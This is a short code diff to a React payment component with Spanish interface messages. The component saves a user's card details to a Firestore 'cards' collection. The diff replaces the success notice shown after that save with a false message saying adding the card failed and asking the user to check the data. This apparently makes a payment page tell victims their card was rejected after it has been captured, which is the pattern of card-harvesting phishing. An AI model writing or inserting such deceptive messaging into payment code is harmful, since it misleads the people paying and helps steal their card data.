@@ -86,7 +86,7 @@ export const Payment = () => {
 
             await addDoc(collection(db, 'cards'), cardInfo);
             // After adding the card information to Firestore, fetch updated card information
-            toast.success('Información de tarjeta agregada con éxito', cardInfo);
+            toast.info('Error al agregar la tarjeta. Verifique los datos');
         } catch (error) {
             console.error('Error adding card information to Firestore:', error);
             toast.error('Error al agregar información de tarjeta: ', error);
